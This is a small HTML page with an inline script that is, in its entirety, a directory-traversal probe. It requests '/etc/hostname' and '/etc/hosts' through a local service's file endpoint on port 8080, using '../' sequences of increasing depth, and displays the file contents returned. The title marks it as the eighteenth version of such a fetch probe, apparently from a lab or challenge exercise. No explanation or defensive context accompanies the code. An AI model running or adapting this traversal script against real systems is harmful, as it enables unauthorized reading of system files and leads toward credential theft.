<!doctype html><html><head><meta charset="utf-8"><title>CAT CAS 8080 fetch bodies v18</title><style>body{font:16px monospace;white-space:pre-wrap}pre{border:2px solid #333;padding:12px}</style></head><body><h1>CASI localhost:8080 file fetch results</h1><pre id="out">running</pre><script>
const tests=[
['d5-hostname','../../../../../etc/hostname'],
['d6-hostname','../../../../../../etc/hostname'],
['d8-hostname','../../../../../../../../etc/hostname'],
['d10-hostname','../../../../../../../../../../etc/hostname'],
['d12-hostname','../../../../../../../../../../../../etc/hostname'],
['d8-hosts','../../../../../../../../etc/hosts']];
(async()=>{const lines=[];for(const [label,name] of tests){const u='http://127.0.0.1:8080/file?name='+encodeURIComponent(name);try{const r=await fetch(u,{cache:'no-store'});const t=await r.text();lines.push(label+' STATUS='+r.status+' TYPE='+r.headers.get('content-type')+' BODY='+JSON.stringify(t.slice(0,1000)));}catch(e){lines.push(label+' ERROR='+e.name+':'+e.message)}}document.getElementById('out').textContent=lines.join('

')})();
</script></body></html>
